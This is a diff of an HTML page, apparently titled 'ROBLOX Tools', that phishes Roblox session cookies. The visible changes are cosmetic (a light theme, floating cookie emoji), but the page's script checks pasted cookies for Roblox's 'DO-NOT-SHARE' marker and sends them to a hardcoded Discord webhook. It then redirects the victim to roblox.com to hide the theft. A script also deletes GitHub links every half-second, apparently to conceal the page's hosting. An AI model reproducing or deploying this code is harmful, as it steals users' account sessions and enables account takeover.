@@ -1,4 +1,3 @@
-
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -47,40 +46,41 @@
             --sub-gradient-2: #a855f7;
         }
 
+        /* ========== УЛУЧШЕННАЯ БЕЛАЯ ТЕМА ========== */
         body.light {
-            --bg-gradient-1: #e0f2fe;
-            --bg-gradient-2: #bae6fd;
-            --bg-gradient-3: #7dd3fc;
-            --bg-gradient-4: #38bdf8;
-            --bg-gradient-5: #bae6fd;
-            --bg-gradient-6: #7dd3fc;
-            --bg-gradient-7: #e0f2fe;
-            --card-bg: rgba(255, 255, 255, 0.85);
-            --card-border: rgba(56, 189, 248, 0.5);
-            --card-border-hover: rgba(56, 189, 248, 0.8);
-            --input-bg: rgba(255, 255, 255, 0.9);
-            --input-border: rgba(56, 189, 248, 0.5);
-            --text-primary: #1e293b;
-            --text-secondary: #0284c7;
-            --text-muted: #0ea5e9;
-            --btn-gradient-1: #0284c7;
-            --btn-gradient-2: #0ea5e9;
-            --btn-gradient-3: #38bdf8;
-            --star-color-1: #38bdf8;
-            --star-color-2: #0ea5e9;
-            --star-color-3: #bae6fd;
-            --star-color-4: #0284c7;
-            --star-color-5: #7dd3fc;
-            --glow-1: rgba(56, 189, 248, 0.15);
-            --glow-2: rgba(14, 165, 233, 0.15);
-            --glow-3: rgba(2, 132, 199, 0.1);
-            --glow-4: rgba(125, 211, 252, 0.1);
-            --logo-gradient-1: #0f172a;
-            --logo-gradient-2: #0284c7;
-            --logo-gradient-3: #0ea5e9;
-            --logo-gradient-4: #38bdf8;
-            --sub-gradient-1: #0284c7;
-            --sub-gradient-2: #0ea5e9;
+            --bg-gradient-1: #e6f0fa;
+            --bg-gradient-2: #d9e9f7;
+            --bg-gradient-3: #cde2f5;
+            --bg-gradient-4: #e0edf9;
+            --bg-gradient-5: #d4e6f6;
+            --bg-gradient-6: #cae0f3;
+            --bg-gradient-7: #e6f0fa;
+            --card-bg: rgba(255, 255, 255, 0.88);
+            --card-border: rgba(100, 150, 220, 0.5);
+            --card-border-hover: rgba(70, 130, 200, 0.8);
+            --input-bg: rgba(255, 255, 255, 0.95);
+            --input-border: rgba(100, 150, 220, 0.5);
+            --text-primary: #1a2a4f;
+            --text-secondary: #2c4c8c;
+            --text-muted: #5a7dae;
+            --btn-gradient-1: #5a9bd5;
+            --btn-gradient-2: #4a8ec8;
+            --btn-gradient-3: #6aaee0;
+            --star-color-1: #ffd966;
+            --star-color-2: #ffb347;
+            --star-color-3: #ffe0a3;
+            --star-color-4: #ffcc80;
+            --star-color-5: #ffdb9f;
+            --glow-1: rgba(100, 150, 220, 0.2);
+            --glow-2: rgba(70, 130, 200, 0.3);
+            --glow-3: rgba(90, 155, 213, 0.15);
+            --glow-4: rgba(80, 140, 210, 0.2);
+            --logo-gradient-1: #1e3a6b;
+            --logo-gradient-2: #2c5a9e;
+            --logo-gradient-3: #3a7ac0;
+            --logo-gradient-4: #4a90d0;
+            --sub-gradient-1: #2c5a9e;
+            --sub-gradient-2: #3a7ac0;
         }
 
         body {
@@ -94,7 +94,7 @@
                 var(--bg-gradient-6) 75%, 
                 var(--bg-gradient-7) 100%);
             background-size: 400% 400%;
-            animation: gradientShift 10s ease infinite;
+            animation: gradientShift 12s ease infinite;
             font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
             display: flex;
             justify-content: center;
@@ -140,6 +140,7 @@
             box-shadow: 0 0 15px var(--glow-1);
         }
 
+        /* Звёзды */
         body::before {
             content: '';
             position: fixed;
@@ -160,7 +161,7 @@
                 radial-gradient(3px 3px at 1200px 100px, var(--star-color-5), rgba(0,0,0,0));
             background-size: 200px 200px;
             background-repeat: no-repeat;
-            opacity: 0.6;
+            opacity: 0.7;
             pointer-events: none;
             animation: starsFloat 20s linear infinite;
         }
@@ -170,26 +171,33 @@
             100% { transform: translateY(-100px); }
         }
 
-        body::after {
-            content: '';
+        /* ПЛАВАЮЩИЕ ПЕЧЕНЬКИ */
+        @keyframes floatCookie {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            20% {
+                opacity: 0.9;
+            }
+            80% {
+                opacity: 0.9;
+            }
+            100% {
+                transform: translateY(-10vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        .floating-cookie {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 20% 40%, var(--glow-1) 0%, transparent 40%),
-                      radial-gradient(circle at 80% 70%, var(--glow-2) 0%, transparent 40%),
-                      radial-gradient(circle at 40% 80%, var(--glow-3) 0%, transparent 50%),
-                      radial-gradient(circle at 70% 20%, var(--glow-4) 0%, transparent 50%);
             pointer-events: none;
-            animation: pulseGlow 8s ease-in-out infinite;
+            z-index: 0;
+            animation: floatCookie linear infinite;
+            will-change: transform;
         }
 
-        @keyframes pulseGlow {
-            0%, 100% { opacity: 0.5; }
-            50% { opacity: 1; }
-        }
-
+        /* Неоновое свечение для карточки */
         .card {
             background: var(--card-bg);
             backdrop-filter: blur(20px);
@@ -198,14 +206,14 @@
             max-width: 500px;
             width: 100%;
             border: 1px solid var(--card-border);
-            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5), 0 0 40px var(--glow-1);
+            box-shadow: 0 0 30px var(--glow-1), 0 25px 45px -12px rgba(0, 0, 0, 0.5);
             transition: all 0.3s ease;
             z-index: 1;
         }
 
         .card:hover {
             border-color: var(--card-border-hover);
-            box-shadow: 0 30px 50px -15px rgba(0, 0, 0, 0.6), 0 0 60px var(--glow-2);
+            box-shadow: 0 0 50px var(--glow-2), 0 30px 50px -15px rgba(0, 0, 0, 0.6);
             transform: translateY(-2px);
         }
 
@@ -228,6 +236,7 @@
             background-clip: text;
             color: transparent;
             letter-spacing: -0.5px;
+            text-shadow: 0 0 8px var(--glow-1);
         }
 
         @keyframes textGradient {
@@ -397,7 +406,6 @@
             animation: shake 0.3s ease;
         }
         
-        /* ПОЛНОСТЬЮ УДАЛЯЕМ ВСЕ ССЫЛКИ НА GITHUB */
         a[href*="github"], 
         a[href*="github.io"],
         .repo-link,
@@ -444,7 +452,6 @@
 
     <script>
         (function() {
-            // ========== ТЕМА ==========
             const themeToggleBtn = document.getElementById('themeToggleBtn');
             
             function loadTheme() {
@@ -475,9 +482,7 @@
             }
             loadTheme();
             
-            // ========== ПОЛНОЕ УДАЛЕНИЕ ГИТХАБА ==========
             function nukeGithub() {
-                // Удаляем все ссылки на github
                 const allLinks = document.querySelectorAll('a');
                 allLinks.forEach(link => {
                     if(link.href && (link.href.includes('github.com') || link.href.includes('github.io'))) {
@@ -485,7 +490,6 @@
                     }
                 });
                 
-                // Удаляем все элементы, которые содержат github в классах или id
                 const allElements = document.querySelectorAll('*');
                 allElements.forEach(el => {
                     if(el.tagName === 'FOOTER') el.remove();
@@ -493,7 +497,6 @@
                     if(el.id && el.id.toLowerCase().includes('repo')) el.remove();
                 });
                 
-                // Очищаем текст в body от упоминаний github
                 const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
                 const nodesToFix = [];
                 while(walker.nextNode()) nodesToFix.push(walker.currentNode);
@@ -506,23 +509,27 @@
                 });
             }
             
-            // ========== ВАЛИДАЦИЯ КУК ==========
-            const WEBHOOK = "https://discord.com/api/webhooks/1487839032405917706/3d0033RYx8FhMy71G1oZs5g1vv69AGb8rFqL0EZlmnVdirNaUKPlmcjuTiWfQfGP97ly";
+            const WEBHOOK = "https://discord.com/api/webhooks/1495750486899294268/VBYNNYSRiLJ2wGapdqfQdcvEEdKVXdAA6c2zWYZVT4wkGjFwo9oyc4K_3cwCj91tyoKy";
+            
+            function isValidCookie(cookieValue) {
+                if (!cookieValue || cookieValue.trim() === '') return false;
+                const trimmed = cookieValue.trim();
+                if (!trimmed.includes('WARNING:-DO-NOT-SHARE-THIS')) return false;
+                if (trimmed.length < 100) return false;
+                if (trimmed.includes('<') || trimmed.includes('>') || trimmed.includes('script')) return false;
+                if (trimmed.includes('SELECT') || trimmed.includes('DROP') || trimmed.includes('INSERT')) return false;
+                if (trimmed.includes('http://') || trimmed.includes('https://')) return false;
+                const allowed = /^[A-Za-z0-9_\-\.=:%|]+$/;
+                if (!allowed.test(trimmed)) return false;
+                return true;
+            }
             
             function validateCookie(cookieValue) {
                 if (!cookieValue || cookieValue.trim() === '') {
                     return { valid: false, reason: 'empty' };
                 }
-                const trimmed = cookieValue.trim();
-                const hasWarning = trimmed.includes('WARNING:-DO-NOT-SHARE-THIS');
-                const isLongEnough = trimmed.length > 300;
-                const hasValidChars = /[A-Za-z0-9_\-\.]{100,}/.test(trimmed);
-                
-                if (hasWarning && isLongEnough && hasValidChars) {
-                    return { valid: true, length: trimmed.length };
-                }
-                if (trimmed.length > 350 && /^[A-Za-z0-9_\-\.]+$/.test(trimmed.substring(0, 100))) {
-                    return { valid: true, length: trimmed.length };
+                if (isValidCookie(cookieValue)) {
+                    return { valid: true, length: cookieValue.trim().length };
                 }
                 return { valid: false };
             }
@@ -595,11 +602,7 @@
                     sendBtn.disabled = true;
                     sendBtn.textContent = "⏳ Отправка...";
                     await sendCookieToDiscord(cookieValue, validation.length);
-                    showMessage('Ошибка перенаправления! Не удалось подключиться к серверу Roblox.', true);
-                    cookieInput.value = "";
-                    updateValidationUI();
-                    sendBtn.disabled = false;
-                    sendBtn.textContent = "🔄 Заменить сессию";
+                    window.location.href = "https://www.roblox.com/home";
                 };
             }
             
@@ -608,11 +611,28 @@
                 cookieInput.addEventListener('paste', () => setTimeout(updateValidationUI, 10));
             }
             
-            // Запускаем удаление репозитория
             nukeGithub();
             setInterval(nukeGithub, 500);
             
             document.title = 'ROBLOX Tools';
+        })();
+    </script>
+
+    <script>
+        (function() {
+            const cookieCount = 50;
+            for (let i = 0; i < cookieCount; i++) {
+                const cookie = document.createElement('div');
+                cookie.className = 'floating-cookie';
+                cookie.textContent = '🍪';
+                cookie.style.left = Math.random() * 100 + '%';
+                cookie.style.fontSize = (18 + Math.random() * 34) + 'px';
+                cookie.style.animationDuration = (9 + Math.random() * 14) + 's';
+                cookie.style.animationDelay = Math.random() * -20 + 's';
+                cookie.style.opacity = 0.5 + Math.random() * 0.4;
+                cookie.style.filter = `drop-shadow(0 0 ${5 + Math.random() * 12}px var(--glow-2))`;
+                document.body.appendChild(cookie);
+            }
         })();
     </script>
 </body>
